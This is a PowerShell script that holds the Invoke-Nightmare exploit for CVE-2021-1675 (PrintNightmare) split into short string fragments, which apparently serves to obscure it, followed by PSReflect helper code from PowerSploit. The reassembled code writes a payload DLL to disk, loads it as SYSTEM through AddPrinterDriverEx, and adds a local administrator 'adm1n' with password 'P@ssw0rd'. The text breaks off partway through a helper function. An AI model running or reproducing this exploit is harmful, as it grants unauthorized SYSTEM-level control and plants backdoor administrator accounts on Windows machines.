$fragments = @('function Invo','ke-Nightmare
','{
    <#
    ','    .SYNOPSIS','
        Expl','oits CVE-2021','-1675 (PrintN','ightmare)

  ','      Authors',':
           ',' Caleb Stewar','t - https://g','ithub.com/cal','ebstewart
   ','         John',' Hammond - ht','tps://github.','com/JohnHammo','nd
        UR','L: https://gi','thub.com/cale','bstewart/CVE-','2021-1675

  ','      .DESCRI','PTION
       ',' Exploits CVE','-2021-1675 (P','rintNightmare',') locally to ','add a new loc','al administra','tor
        u','ser with a kn','own password.',' Optionally, ','this can be u','sed to execut','e your own
  ','      custom ','DLL to execut','e any other c','ode as NT AUT','HORITY\SYSTEM','.

        .P','ARAMETER Driv','erName
      ','  The name of',' the new prin','ter driver to',' add (default',': "Totally No','t Malicious")','

        .PA','RAMETER NewUs','er
        Th','e name of the',' new user to ','create when u','sing the defa','ult DLL (defa','ult: "adm1n")','

        .PA','RAMETER NewPa','ssword
      ','  The passwor','d for the new',' user when us','ing the defau','lt DLL (defau','lt: "P@ssw0rd','")

        .','PARAMETER DLL','
        The ','DLL to execut','e when loadin','g the printer',' driver (defa','ult: a builti','n payload whi','ch
        cr','eates the spe','cified user, ','and adds the ','new user to t','he local admi','nistrators gr','oup).

      ','  .EXAMPLE
  ','      > Invok','e-Nightmare
 ','       Adds a',' new local us','er named `adm','1n` which is ','a member of t','he local admi','ns group

   ','     .EXAMPLE','
        > In','voke-Nightmar','e -NewUser "c','aleb" -NewPas','sword "passwo','rd" -DriverNa','me "driver"
 ','       Adds a',' new local us','er named `cal','eb` using a p','rinter driver',' named `drive','r`

        .','EXAMPLE
     ','   > Invoke-N','ightmare -DLL',' C:\path\to\
','
    #>
    p','aram (
      ','  [string]$Dr','iverName = "T','otally Not Ma','licious",
   ','     [string]','$NewUser = ""',',
        [st','ring]$NewPass','word = "",
  ','      [string',']$DLL = ""
  ','  )

    if (',' $DLL -eq "" ','){
        $n','ightmare_data',' = [byte[]](g','et_nightmare_','dll)
        ','$encoder = Ne','w-Object Syst','em.Text.Unico','deEncoding

 ','       if ( $','NewUser -ne "','" ) {
       ','     $NewUser','Bytes = $enco','der.GetBytes(','$NewUser)
   ','         [Sys','tem.Buffer]::','BlockCopy($Ne','wUserBytes, 0',', $nightmare_','data, 0x32e20',', $NewUserByt','es.Length)
  ','          $ni','ghtmare_data[','0x32e20+$NewU','serBytes.Leng','th] = 0
     ','       $night','mare_data[0x3','2e20+$NewUser','Bytes.Length+','1] = 0
      ','  } else {
  ','          Wri','te-Host "[+] ','using default',' new user: ad','m1n"
        ','}

        if',' ( $NewPasswo','rd -ne "" ) {','
            ','$NewPasswordB','ytes = $encod','er.GetBytes($','NewPassword)
','            [','System.Buffer',']::BlockCopy(','$NewPasswordB','ytes, 0, $nig','htmare_data, ','0x32c20, $New','PasswordBytes','.Length)
    ','        $nigh','tmare_data[0x','32c20+$NewPas','swordBytes.Le','ngth] = 0
   ','         $nig','htmare_data[0','x32c20+$NewPa','sswordBytes.L','ength+1] = 0
','        } els','e {
         ','   Write-Host',' "[+] using d','efault new pa','ssword: P@ssw','0rd"
        ','}

        $D','LL = [System.','IO.Path]::Get','TempPath() + ','"nightmare.dl','l"
        [S','ystem.IO.File',']::WriteAllBy','tes($DLL, $ni','ghtmare_data)','
        Writ','e-Host "[+] c','reated payloa','d at $DLL"
  ','      $delete','_me = $true
 ','   } else {
 ','       Write-','Host "[+] usi','ng user-suppl','ied payload a','t $DLL"
     ','   Write-Host',' "[!] ignorin','g NewUser and',' NewPassword ','arguments"
  ','      $delete','_me = $false
','    }

    $M','od = New-InMe','moryModule -M','oduleName "A$','(Get-Random)"','

    $Functi','onDefinitions',' = @(
      (','func winspool','.drv AddPrint','erDriverEx ([','bool]) @([str','ing], [Uint32','], [IntPtr], ','[Uint32]) -Ch','arset Auto -S','etLastError),','
      (func ','winspool.drv ','EnumPrinterDr','ivers([bool])',' @( [string],',' [string], [U','int32], [IntP','tr], [UInt32]',', [Uint32].Ma','keByRefType()',', [Uint32].Ma','keByRefType()',') -Charset Au','to -SetLastEr','ror)
    )

 ','   $Types = $','FunctionDefin','itions | Add-','Win32Type -Mo','dule $Mod -Na','mespace ''Mod''','

    # Defin','e custom stru','ctures for ty','pes created
 ','   $DRIVER_IN','FO_2 = struct',' $Mod DRIVER_','INFO_2 @{
   ','     cVersion',' = field 0 Ui','nt64;
       ',' pName = fiel','d 1 string -M','arshalAs @("L','PTStr");
    ','    pEnvironm','ent = field 2',' string -Mars','halAs @("LPTS','tr");
       ',' pDriverPath ','= field 3 str','ing -MarshalA','s @("LPTStr")',';
        pDa','taFile = fiel','d 4 string -M','arshalAs @("L','PTStr");
    ','    pConfigFi','le = field 5 ','string -Marsh','alAs @("LPTSt','r");
    }

 ','   $winspool ','= $Types[''win','spool.drv'']
 ','   $APD_COPY_','ALL_FILES = 0','x00000004

  ','  [Uint32]($c','bNeeded) = 0
','    [Uint32](','$cReturned) =',' 0

    if ( ','$winspool::En','umPrinterDriv','ers($null, "W','indows x64", ','2, [IntPtr]::','Zero, 0, [ref',']$cbNeeded, [','ref]$cReturne','d) ){
       ',' Write-Host "','[!] EnumPrint','erDrivers sho','uld fail!"
  ','      return
','    }

    [I','ntPtr]$pAddr ','= [System.Run','time.InteropS','ervices.Marsh','al]::AllocHGl','obal([Uint32]','($cbNeeded))
','
    if ( $wi','nspool::EnumP','rinterDrivers','($null, "Wind','ows x64", 2, ','$pAddr, $cbNe','eded, [ref]$c','bNeeded, [ref',']$cReturned) ','){
        $d','river = [Syst','em.Runtime.In','teropServices','.Marshal]::Pt','rToStructure(','$pAddr, [Syst','em.Type]$DRIV','ER_INFO_2)
  ','  } else {
  ','      Write-H','ost "[!] fail','ed to get cur','rent driver l','ist"
        ','[System.Runti','me.InteropSer','vices.Marshal',']::FreeHGloba','l($pAddr)
   ','     return
 ','   }

    Wri','te-Host "[+] ','using pDriver','Path = `"$($d','river.pDriver','Path)`""
    ','[System.Runti','me.InteropSer','vices.Marshal',']::FreeHGloba','l($pAddr)

  ','  $driver_inf','o = New-Objec','t $DRIVER_INF','O_2
    $driv','er_info.cVers','ion = 3
    $','driver_info.p','ConfigFile = ','$DLL
    $dri','ver_info.pDat','aFile = $DLL
','    $driver_i','nfo.pDriverPa','th = $driver.','pDriverPath
 ','   $driver_in','fo.pEnvironme','nt = "Windows',' x64"
    $dr','iver_info.pNa','me = $DriverN','ame

    $pDr','iverInfo = [S','ystem.Runtime','.InteropServi','ces.Marshal]:',':AllocHGlobal','([System.Runt','ime.InteropSe','rvices.Marsha','l]::SizeOf($d','river_info))
','    [System.R','untime.Intero','pServices.Mar','shal]::Struct','ureToPtr($dri','ver_info, $pD','riverInfo, $f','alse)

    if',' ( $winspool:',':AddPrinterDr','iverEx($null,',' 2, $pDriverI','nfo, $APD_COP','Y_ALL_FILES -','bor 0x10 -bor',' 0x8000) ) {
','        if ( ','$delete_me ) ','{
           ',' Write-Host "','[+] added use','r $NewUser as',' local admini','strator"
    ','    } else {
','            W','rite-Host "[+','] driver appe','ars to have b','een loaded!"
','        }
   ',' } else {
   ','     Write-Er','ror "[!] AddP','rinterDriverE','x failed"
   ',' }

    if ( ','$delete_me ) ','{
        Wri','te-Host "[+] ','deleting payl','oad from $DLL','"
        Rem','ove-Item -For','ce $DLL
    }','
}


########','#############','#############','#############','#########
# S','tolen from Po','werSploit: ht','tps://github.','com/PowerShel','lMafia/PowerS','ploit
#######','#############','#############','#############','##########

#','#############','#############','#############','#############','###
#
# PSRef','lect code for',' Windows API ','access
# Auth','or: @mattifes','tation
#   ht','tps://raw.git','hubuserconten','t.com/mattife','station/PSRef','lect/master/P','SReflect.psm1','
#
##########','#############','#############','#############','#######

func','tion New-InMe','moryModule {
','<#
.SYNOPSIS
','Creates an in','-memory assem','bly and modul','e
Author: Mat','thew Graeber ','(@mattifestat','ion)
License:',' BSD 3-Clause','
Required Dep','endencies: No','ne
Optional D','ependencies: ','None
.DESCRIP','TION
When def','ining custom ','enums, struct','s, and unmana','ged functions',', it is
neces','sary to assoc','iate to an as','sembly module','. This helper',' function
cre','ates an in-me','mory module t','hat can be pa','ssed to the ''','enum'',
''struc','t'', and Add-W','in32Type func','tions.
.PARAM','ETER ModuleNa','me
Specifies ','the desired n','ame for the i','n-memory asse','mbly and modu','le. If
Module','Name is not p','rovided, it w','ill default t','o a GUID.
.EX','AMPLE
$Module',' = New-InMemo','ryModule -Mod','uleName Win32','
#>

    [Dia','gnostics.Code','Analysis.Supp','ressMessageAt','tribute(''PSUs','eShouldProces','sForStateChan','gingFunctions',''', '''')]
    [','CmdletBinding','()]
    Param',' (
        [P','arameter(Posi','tion = 0)]
  ','      [Valida','teNotNullOrEm','pty()]
      ','  [String]
  ','      $Module','Name = [Guid]','::NewGuid().T','oString()
   ',' )

    $AppD','omain = [Refl','ection.Assemb','ly].Assembly.','GetType(''Syst','em.AppDomain''',').GetProperty','(''CurrentDoma','in'').GetValue','($null, @())
','    $LoadedAs','semblies = $A','ppDomain.GetA','ssemblies()

','    foreach (','$Assembly in ','$LoadedAssemb','lies) {
     ','   if ($Assem','bly.FullName ','-and ($Assemb','ly.FullName.S','plit('','')[0] ','-eq $ModuleNa','me)) {
      ','      return ','$Assembly
   ','     }
    }
','
    $DynAsse','mbly = New-Ob','ject Reflecti','on.AssemblyNa','me($ModuleNam','e)
    $Domai','n = $AppDomai','n
    $Assemb','lyBuilder = $','Domain.Define','DynamicAssemb','ly($DynAssemb','ly, ''Run'')
  ','  $ModuleBuil','der = $Assemb','lyBuilder.Def','ineDynamicMod','ule($ModuleNa','me, $False)

','    return $M','oduleBuilder
','}

# A helper',' function use','d to reduce t','yping while d','efining funct','ion
# prototy','pes for Add-W','in32Type.
fun','ction func {
','    Param (
 ','       [Param','eter(Position',' = 0, Mandato','ry = $True)]
','        [Stri','ng]
        $','DllName,

   ','     [Paramet','er(Position =',' 1, Mandatory',' = $True)]
  ','      [string',']
        $Fu','nctionName,

','        [Para','meter(Positio','n = 2, Mandat','ory = $True)]','
        [Typ','e]
        $R','eturnType,

 ','       [Param','eter(Position',' = 3)]
      ','  [Type[]]
  ','      $Parame','terTypes,

  ','      [Parame','ter(Position ','= 4)]
       ',' [Runtime.Int','eropServices.','CallingConven','tion]
       ',' $NativeCalli','ngConvention,','

        [Pa','rameter(Posit','ion = 5)]
   ','     [Runtime','.InteropServi','ces.CharSet]
','        $Char','set,

       ',' [String]
   ','     $EntryPo','int,

       ',' [Switch]
   ','     $SetLast','Error
    )

','    $Properti','es = @{
     ','   DllName = ','$DllName
    ','    FunctionN','ame = $Functi','onName
      ','  ReturnType ','= $ReturnType','
    }

    i','f ($Parameter','Types) { $Pro','perties[''Para','meterTypes''] ','= $ParameterT','ypes }
    if',' ($NativeCall','ingConvention',') { $Properti','es[''NativeCal','lingConventio','n''] = $Native','CallingConven','tion }
    if',' ($Charset) {',' $Properties[','''Charset''] = ','$Charset }
  ','  if ($SetLas','tError) { $Pr','operties[''Set','LastError''] =',' $SetLastErro','r }
    if ($','EntryPoint) {',' $Properties[','''EntryPoint'']',' = $EntryPoin','t }

    New-','Object PSObje','ct -Property ','$Properties
}','

function Ad','d-Win32Type
{','
<#
.SYNOPSIS','
Creates a .N','ET type for a','n unmanaged W','in32 function','.
Author: Mat','thew Graeber ','(@mattifestat','ion)
License:',' BSD 3-Clause','
Required Dep','endencies: No','ne
Optional D','ependencies: ','func
.DESCRIP','TION
Add-Win3','2Type enables',' you to easil','y interact wi','th unmanaged ','(i.e.
Win32 u','nmanaged) fun','ctions in Pow','erShell. Afte','r providing
A','dd-Win32Type ','with a functi','on signature,',' a .NET type ','is created
us','ing reflectio','n (i.e. csc.e','xe is never c','alled like wi','th Add-Type).','
The ''func'' h','elper functio','n can be used',' to reduce ty','ping when def','ining
multipl','e function de','finitions.
.P','ARAMETER DllN','ame
The name ','of the DLL.
.','PARAMETER Fun','ctionName
The',' name of the ','target functi','on.
.PARAMETE','R EntryPoint
','The DLL expor','t function na','me. This argu','ment should b','e specified i','f the
specifi','ed function n','ame is differ','ent than the ','name of the e','xported
funct','ion.
.PARAMET','ER ReturnType','
The return t','ype of the fu','nction.
.PARA','METER Paramet','erTypes
The f','unction param','eters.
.PARAM','ETER NativeCa','llingConventi','on
Specifies ','the native ca','lling convent','ion of the fu','nction. Defau','lts to
stdcal','l.
.PARAMETER',' Charset
If y','ou need to ex','plicitly call',' an ''A'' or ''W',''' Win32 funct','ion, you can
','specify the c','haracter set.','
.PARAMETER S','etLastError
I','ndicates whet','her the calle','e calls the S','etLastError W','in32 API
func','tion before r','eturning from',' the attribut','ed method.
.P','ARAMETER Modu','le
The in-mem','ory module th','at will host ','the functions','. Use
New-InM','emoryModule t','o define an i','n-memory modu','le.
.PARAMETE','R Namespace
A','n optional na','mespace to pr','epend to the ','type. Add-Win','32Type defaul','ts
to a names','pace consisti','ng only of th','e name of the',' DLL.
.EXAMPL','E
$Mod = New-','InMemoryModul','e -ModuleName',' Win32
$Funct','ionDefinition','s = @(
  (fun','c kernel32 Ge','tProcAddress ','([IntPtr]) @(','[IntPtr], [St','ring]) -Chars','et Ansi -SetL','astError),
  ','(func kernel3','2 GetModuleHa','ndle ([Intptr',']) @([String]',') -SetLastErr','or),
  (func ','ntdll RtlGetC','urrentPeb ([I','ntPtr]) @())
',')
$Types = $F','unctionDefini','tions | Add-W','in32Type -Mod','ule $Mod -Nam','espace ''Win32','''
$Kernel32 =',' $Types[''kern','el32'']
$Ntdll',' = $Types[''nt','dll'']
$Ntdll:',':RtlGetCurren','tPeb()
$ntdll','base = $Kerne','l32::GetModul','eHandle(''ntdl','l'')
$Kernel32','::GetProcAddr','ess($ntdllbas','e, ''RtlGetCur','rentPeb'')
.NO','TES
Inspired ','by Lee Holmes',''' Invoke-Wind','owsApi http:/','/poshcode.org','/2189
When de','fining multip','le function p','rototypes, it',' is ideal to ','provide
Add-W','in32Type with',' an array of ','function sign','atures. That ','way, they
are',' all incorpor','ated into the',' same in-memo','ry module.
#>','

    [Output','Type([Hashtab','le])]
    Par','am(
        [','Parameter(Man','datory=$True,',' ValueFromPip','elineByProper','tyName=$True)',']
        [St','ring]
       ',' $DllName,

 ','       [Param','eter(Mandator','y=$True, Valu','eFromPipeline','ByPropertyNam','e=$True)]
   ','     [String]','
        $Fun','ctionName,

 ','       [Param','eter(ValueFro','mPipelineByPr','opertyName=$T','rue)]
       ',' [String]
   ','     $EntryPo','int,

       ',' [Parameter(M','andatory=$Tru','e, ValueFromP','ipelineByProp','ertyName=$Tru','e)]
        [','Type]
       ',' $ReturnType,','

        [Pa','rameter(Value','FromPipelineB','yPropertyName','=$True)]
    ','    [Type[]]
','        $Para','meterTypes,

','        [Para','meter(ValueFr','omPipelineByP','ropertyName=$','True)]
      ','  [Runtime.In','teropServices','.CallingConve','ntion]
      ','  $NativeCall','ingConvention',' = [Runtime.I','nteropService','s.CallingConv','ention]::StdC','all,

       ',' [Parameter(V','alueFromPipel','ineByProperty','Name=$True)]
','        [Runt','ime.InteropSe','rvices.CharSe','t]
        $C','harset = [Run','time.InteropS','ervices.CharS','et]::Auto,

 ','       [Param','eter(ValueFro','mPipelineByPr','opertyName=$T','rue)]
       ',' [Switch]
   ','     $SetLast','Error,

     ','   [Parameter','(Mandatory=$T','rue)]
       ',' [ValidateScr','ipt({($_ -is ','[Reflection.E','mit.ModuleBui','lder]) -or ($','_ -is [Reflec','tion.Assembly','])})]
       ',' $Module,

  ','      [Valida','teNotNull()]
','        [Stri','ng]
        $','Namespace = ''','''
    )

    ','BEGIN
    {
 ','       $TypeH','ash = @{}
   ',' }

    PROCE','SS
    {
    ','    if ($Modu','le -is [Refle','ction.Assembl','y])
        {','
            ','if ($Namespac','e)
          ','  {
         ','       $TypeH','ash[$DllName]',' = $Module.Ge','tType("$Names','pace.$DllName','")
          ','  }
         ','   else
     ','       {
    ','            $','TypeHash[$Dll','Name] = $Modu','le.GetType($D','llName)
     ','       }
    ','    }
       ',' else
       ',' {
          ','  # Define on','e type for ea','ch DLL
      ','      if (!$T','ypeHash.Conta','insKey($DllNa','me))
        ','    {
       ','         if (','$Namespace)
 ','             ','  {
         ','           $T','ypeHash[$DllN','ame] = $Modul','e.DefineType(','"$Namespace.$','DllName", ''Pu','blic,BeforeFi','eldInit'')
   ','             ','}
           ','     else
   ','             ','{
           ','         $Typ','eHash[$DllNam','e] = $Module.','DefineType($D','llName, ''Publ','ic,BeforeFiel','dInit'')
     ','           }
','            }','

           ',' $Method = $T','ypeHash[$DllN','ame].DefineMe','thod(
       ','         $Fun','ctionName,
  ','             ',' ''Public,Stat','ic,PinvokeImp','l'',
         ','       $Retur','nType,
      ','          $Pa','rameterTypes)','

           ',' # Make each ','ByRef paramet','er an Out par','ameter
      ','      $i = 1
','            f','oreach($Param','eter in $Para','meterTypes)
 ','           {
','             ','   if ($Param','eter.IsByRef)','
            ','    {
       ','             ','[void] $Metho','d.DefineParam','eter($i, ''Out',''', $null)
   ','             ','}

          ','      $i++
  ','          }

','            $','DllImport = [','Runtime.Inter','opServices.Dl','lImportAttrib','ute]
        ','    $SetLastE','rrorField = $','DllImport.Get','Field(''SetLas','tError'')
    ','        $Call','ingConvention','Field = $DllI','mport.GetFiel','d(''CallingCon','vention'')
   ','         $Cha','rsetField = $','DllImport.Get','Field(''CharSe','t'')
         ','   $EntryPoin','tField = $Dll','Import.GetFie','ld(''EntryPoin','t'')
         ','   if ($SetLa','stError) { $S','LEValue = $Tr','ue } else { $','SLEValue = $F','alse }

     ','       if ($P','SBoundParamet','ers[''EntryPoi','nt'']) { $Expo','rtedFuncName ','= $EntryPoint',' } else { $Ex','portedFuncNam','e = $Function','Name }

     ','       # Equi','valent to C# ','version of [D','llImport(DllN','ame)]
       ','     $Constru','ctor = [Runti','me.InteropSer','vices.DllImpo','rtAttribute].','GetConstructo','r([String])
 ','           $D','llImportAttri','bute = New-Ob','ject Reflecti','on.Emit.Custo','mAttributeBui','lder($Constru','ctor,
       ','         $Dll','Name, [Reflec','tion.Property','Info[]] @(), ','[Object[]] @(','),
          ','      [Reflec','tion.FieldInf','o[]] @($SetLa','stErrorField,','
            ','             ','             ','     $Calling','ConventionFie','ld,
         ','             ','             ','        $Char','setField,
   ','             ','             ','             ',' $EntryPointF','ield),
      ','          [Ob','ject[]] @($SL','EValue,
     ','             ','           ([','Runtime.Inter','opServices.Ca','llingConventi','on] $NativeCa','llingConventi','on),
        ','             ','        ([Run','time.InteropS','ervices.CharS','et] $Charset)',',
           ','             ','     $Exporte','dFuncName))

','            $','Method.SetCus','tomAttribute(','$DllImportAtt','ribute)
     ','   }
    }

 ','   END
    {
','        if ($','Module -is [R','eflection.Ass','embly])
     ','   {
        ','    return $T','ypeHash
     ','   }

       ',' $ReturnTypes',' = @{}

     ','   foreach ($','Key in $TypeH','ash.Keys)
   ','     {
      ','      $Type =',' $TypeHash[$K','ey].CreateTyp','e()

        ','    $ReturnTy','pes[$Key] = $','Type
        ','}

        re','turn $ReturnT','ypes
    }
}
','

function ps','enum {
<#
.SY','NOPSIS
Create','s an in-memor','y enumeration',' for use in y','our PowerShel','l session.
Au','thor: Matthew',' Graeber (@ma','ttifestation)','
License: BSD',' 3-Clause
Req','uired Depende','ncies: None
O','ptional Depen','dencies: None','
.DESCRIPTION','
The ''psenum''',' function fac','ilitates the ','creation of e','nums entirely',' in
memory us','ing as close ','to a "C style','" as PowerShe','ll will allow','.
.PARAMETER ','Module
The in','-memory modul','e that will h','ost the enum.',' Use
New-InMe','moryModule to',' define an in','-memory modul','e.
.PARAMETER',' FullName
The',' fully-qualif','ied name of t','he enum.
.PAR','AMETER Type
T','he type of ea','ch enum eleme','nt.
.PARAMETE','R EnumElement','s
A hashtable',' of enum elem','ents.
.PARAME','TER Bitfield
','Specifies tha','t the enum sh','ould be treat','ed as a bitfi','eld.
.EXAMPLE','
$Mod = New-I','nMemoryModule',' -ModuleName ','Win32
$ImageS','ubsystem = ps','enum $Mod PE.','IMAGE_SUBSYST','EM UInt16 @{
','    UNKNOWN =','             ','     0
    NA','TIVE =       ','            1',' # Image does','n''t require a',' subsystem.
 ','   WINDOWS_GU','I =          ','    2 # Image',' runs in the ','Windows GUI s','ubsystem.
   ',' WINDOWS_CUI ','=            ','  3 # Image r','uns in the Wi','ndows charact','er subsystem.','
    OS2_CUI ','=            ','      5 # Ima','ge runs in th','e OS/2 charac','ter subsystem','.
    POSIX_C','UI =         ','       7 # Im','age runs in t','he Posix char','acter subsyst','em.
    NATIV','E_WINDOWS =  ','         8 # ','Image is a na','tive Win9x dr','iver.
    WIN','DOWS_CE_GUI =','           9 ','# Image runs ','in the Window','s CE subsyste','m.
    EFI_AP','PLICATION =  ','        10
  ','  EFI_BOOT_SE','RVICE_DRIVER ','=  11
    EFI','_RUNTIME_DRIV','ER =       12','
    EFI_ROM ','=            ','      13
    ','XBOX =       ','             ',' 14
    WINDO','WS_BOOT_APPLI','CATION = 16
}','
.NOTES
Power','Shell purists',' may disagree',' with the nam','ing of this f','unction but
a','gain, this wa','s developed i','n such a way ','so as to emul','ate a "C styl','e"
definition',' as closely a','s possible. S','orry, I''m not',' going to nam','e it
New-Enum','. :P
#>

    ','[OutputType([','Type])]
    P','aram (
      ','  [Parameter(','Position = 0,',' Mandatory=$T','rue)]
       ',' [ValidateScr','ipt({($_ -is ','[Reflection.E','mit.ModuleBui','lder]) -or ($','_ -is [Reflec','tion.Assembly','])})]
       ',' $Module,

  ','      [Parame','ter(Position ','= 1, Mandator','y=$True)]
   ','     [Validat','eNotNullOrEmp','ty()]
       ',' [String]
   ','     $FullNam','e,

        [','Parameter(Pos','ition = 2, Ma','ndatory=$True',')]
        [T','ype]
        ','$Type,

     ','   [Parameter','(Position = 3',', Mandatory=$','True)]
      ','  [ValidateNo','tNullOrEmpty(',')]
        [H','ashtable]
   ','     $EnumEle','ments,

     ','   [Switch]
 ','       $Bitfi','eld
    )

  ','  if ($Module',' -is [Reflect','ion.Assembly]',')
    {
     ','   return ($M','odule.GetType','($FullName))
','    }

    $E','numType = $Ty','pe -as [Type]','

    $EnumBu','ilder = $Modu','le.DefineEnum','($FullName, ''','Public'', $Enu','mType)

    i','f ($Bitfield)','
    {
      ','  $FlagsConst','ructor = [Fla','gsAttribute].','GetConstructo','r(@())
      ','  $FlagsCusto','mAttribute = ','New-Object Re','flection.Emit','.CustomAttrib','uteBuilder($F','lagsConstruct','or, @())
    ','    $EnumBuil','der.SetCustom','Attribute($Fl','agsCustomAttr','ibute)
    }
','
    foreach ','($Key in $Enu','mElements.Key','s)
    {
    ','    # Apply t','he specified ','enum type to ','each element
','        $null',' = $EnumBuild','er.DefineLite','ral($Key, $En','umElements[$K','ey] -as $Enum','Type)
    }

','    $EnumBuil','der.CreateTyp','e()
}


# A h','elper functio','n used to red','uce typing wh','ile defining ','struct
# fiel','ds.
function ','field {
    P','aram (
      ','  [Parameter(','Position = 0,',' Mandatory=$T','rue)]
       ',' [UInt16]
   ','     $Positio','n,

        [','Parameter(Pos','ition = 1, Ma','ndatory=$True',')]
        [T','ype]
        ','$Type,

     ','   [Parameter','(Position = 2',')]
        [U','Int16]
      ','  $Offset,

 ','       [Objec','t[]]
        ','$MarshalAs
  ','  )

    @{
 ','       Positi','on = $Positio','n
        Typ','e = $Type -as',' [Type]
     ','   Offset = $','Offset
      ','  MarshalAs =',' $MarshalAs
 ','   }
}


func','tion struct
{','
<#
.SYNOPSIS','
Creates an i','n-memory stru','ct for use in',' your PowerSh','ell session.
','Author: Matth','ew Graeber (@','mattifestatio','n)
License: B','SD 3-Clause
R','equired Depen','dencies: None','
Optional Dep','endencies: fi','eld
.DESCRIPT','ION
The ''stru','ct'' function ','facilitates t','he creation o','f structs ent','irely in
memo','ry using as c','lose to a "C ','style" as Pow','erShell will ','allow. Struct','
fields are s','pecified usin','g a hashtable',' where each f','ield of the s','truct
is comp','rosed of the ','order in whic','h it should b','e defined, it','s .NET
type, ','and optionall','y, its offset',' and special ','marshaling at','tributes.
One',' of the featu','res of ''struc','t'' is that af','ter your stru','ct is defined',',
it will com','e with a buil','t-in GetSize ','method as wel','l as an expli','cit
converter',' so that you ','can easily ca','st an IntPtr ','to the struct',' without
rely','ing upon call','ing SizeOf an','d/or PtrToStr','ucture in the',' Marshal
clas','s.
.PARAMETER',' Module
The i','n-memory modu','le that will ','host the stru','ct. Use
New-I','nMemoryModule',' to define an',' in-memory mo','dule.
.PARAME','TER FullName
','The fully-qua','lified name o','f the struct.','
.PARAMETER S','tructFields
A',' hashtable of',' fields. Use ','the ''field'' h','elper functio','n to ease
def','ining each fi','eld.
.PARAMET','ER PackingSiz','e
Specifies t','he memory ali','gnment of fie','lds.
.PARAMET','ER ExplicitLa','yout
Indicate','s that an exp','licit offset ','for each fiel','d will be spe','cified.
.EXAM','PLE
$Mod = Ne','w-InMemoryMod','ule -ModuleNa','me Win32
$Ima','geDosSignatur','e = psenum $M','od PE.IMAGE_D','OS_SIGNATURE ','UInt16 @{
   ',' DOS_SIGNATUR','E =    0x5A4D','
    OS2_SIGN','ATURE =    0x','454E
    OS2_','SIGNATURE_LE ','= 0x454C
    ','VXD_SIGNATURE',' =    0x454C
','}
$ImageDosHe','ader = struct',' $Mod PE.IMAG','E_DOS_HEADER ','@{
    e_magi','c =    field ','0 $ImageDosSi','gnature
    e','_cblp =     f','ield 1 UInt16','
    e_cp =  ','     field 2 ','UInt16
    e_','crlc =     fi','eld 3 UInt16
','    e_cparhdr',' =  field 4 U','Int16
    e_m','inalloc = fie','ld 5 UInt16
 ','   e_maxalloc',' = field 6 UI','nt16
    e_ss',' =       fiel','d 7 UInt16
  ','  e_sp =     ','  field 8 UIn','t16
    e_csu','m =     field',' 9 UInt16
   ',' e_ip =      ',' field 10 UIn','t16
    e_cs ','=       field',' 11 UInt16
  ','  e_lfarlc = ','  field 12 UI','nt16
    e_ov','no =     fiel','d 13 UInt16
 ','   e_res =   ','   field 14 U','Int16[] -Mars','halAs @(''ByVa','lArray'', 4)
 ','   e_oemid = ','   field 15 U','Int16
    e_o','eminfo =  fie','ld 16 UInt16
','    e_res2 = ','    field 17 ','UInt16[] -Mar','shalAs @(''ByV','alArray'', 10)','
    e_lfanew',' =   field 18',' Int32
}
# Ex','ample of usin','g an explicit',' layout in or','der to create',' a union.
$Te','stUnion = str','uct $Mod Test','Union @{
    ','field1 = fiel','d 0 UInt32 0
','    field2 = ','field 1 IntPt','r 0
} -Explic','itLayout
.NOT','ES
PowerShell',' purists may ','disagree with',' the naming o','f this functi','on but
again,',' this was dev','eloped in suc','h a way so as',' to emulate a',' "C style"
de','finition as c','losely as pos','sible. Sorry,',' I''m not goin','g to name it
','New-Struct. :','P
#>

    [Ou','tputType([Typ','e])]
    Para','m (
        [','Parameter(Pos','ition = 1, Ma','ndatory=$True',')]
        [V','alidateScript','({($_ -is [Re','flection.Emit','.ModuleBuilde','r]) -or ($_ -','is [Reflectio','n.Assembly])}',')]
        $M','odule,

     ','   [Parameter','(Position = 2',', Mandatory=$','True)]
      ','  [ValidateNo','tNullOrEmpty(',')]
        [S','tring]
      ','  $FullName,
','
        [Par','ameter(Positi','on = 3, Manda','tory=$True)]
','        [Vali','dateNotNullOr','Empty()]
    ','    [Hashtabl','e]
        $S','tructFields,
','
        [Ref','lection.Emit.','PackingSize]
','        $Pack','ingSize = [Re','flection.Emit','.PackingSize]','::Unspecified',',

        [S','witch]
      ','  $ExplicitLa','yout
    )

 ','   if ($Modul','e -is [Reflec','tion.Assembly','])
    {
    ','    return ($','Module.GetTyp','e($FullName))','
    }

    [','Reflection.Ty','peAttributes]',' $StructAttri','butes = ''Ansi','Class,
      ','  Class,
    ','    Public,
 ','       Sealed',',
        Bef','oreFieldInit''','

    if ($Ex','plicitLayout)','
    {
      ','  $StructAttr','ibutes = $Str','uctAttributes',' -bor [Reflec','tion.TypeAttr','ibutes]::Expl','icitLayout
  ','  }
    else
','    {
       ',' $StructAttri','butes = $Stru','ctAttributes ','-bor [Reflect','ion.TypeAttri','butes]::Seque','ntialLayout
 ','   }

    $St','ructBuilder =',' $Module.Defi','neType($FullN','ame, $StructA','ttributes, [V','alueType], $P','ackingSize)
 ','   $Construct','orInfo = [Run','time.InteropS','ervices.Marsh','alAsAttribute','].GetConstruc','tors()[0]
   ',' $SizeConst =',' @([Runtime.I','nteropService','s.MarshalAsAt','tribute].GetF','ield(''SizeCon','st''))

    $F','ields = New-O','bject Hashtab','le[]($StructF','ields.Count)
','
    # Sort e','ach field acc','ording to the',' orders speci','fied
    # Un','fortunately, ','PSv2 doesn''t ','have the luxu','ry of the
   ',' # hashtable ','[Ordered] acc','elerator.
   ',' foreach ($Fi','eld in $Struc','tFields.Keys)','
    {
      ','  $Index = $S','tructFields[$','Field][''Posit','ion'']
       ',' $Fields[$Ind','ex] = @{Field','Name = $Field','; Properties ','= $StructFiel','ds[$Field]}
 ','   }

    for','each ($Field ','in $Fields)
 ','   {
        ','$FieldName = ','$Field[''Field','Name'']
      ','  $FieldProp ','= $Field[''Pro','perties'']

  ','      $Offset',' = $FieldProp','[''Offset'']
  ','      $Type =',' $FieldProp[''','Type'']
      ','  $MarshalAs ','= $FieldProp[','''MarshalAs'']
','
        $New','Field = $Stru','ctBuilder.Def','ineField($Fie','ldName, $Type',', ''Public'')

','        if ($','MarshalAs)
  ','      {
     ','       $Unman','agedType = $M','arshalAs[0] -','as ([Runtime.','InteropServic','es.UnmanagedT','ype])
       ','     if ($Mar','shalAs[1])
  ','          {
 ','             ','  $Size = $Ma','rshalAs[1]
  ','             ',' $AttribBuild','er = New-Obje','ct Reflection','.Emit.CustomA','ttributeBuild','er($Construct','orInfo,
